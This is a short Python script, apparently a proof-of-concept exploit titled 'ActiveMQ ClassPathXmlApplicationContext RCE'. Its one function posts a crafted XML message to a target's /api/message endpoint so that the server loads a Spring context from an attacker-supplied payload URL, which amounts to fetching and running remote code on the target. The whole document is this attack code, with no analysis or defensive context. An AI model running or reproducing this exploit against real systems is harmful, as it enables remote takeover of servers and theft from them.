# ActiveMQ ClassPathXmlApplicationContext RCE
import requests
def exploit(target: str, payload_url: str) -> bool:
    url = f'{target}/api/message?destination=queue://test'
    headers = {'Content-Type': 'application/xml'}
    body = f'<?xml version="1.0"?><beans><bean class="org.springframework.context.support.ClassPathXmlApplicationContext"><constructor-arg value="{payload_url}"/></bean></beans>'
    r = requests.post(url, headers=headers, data=body, timeout=10)
    return r.status_code == 200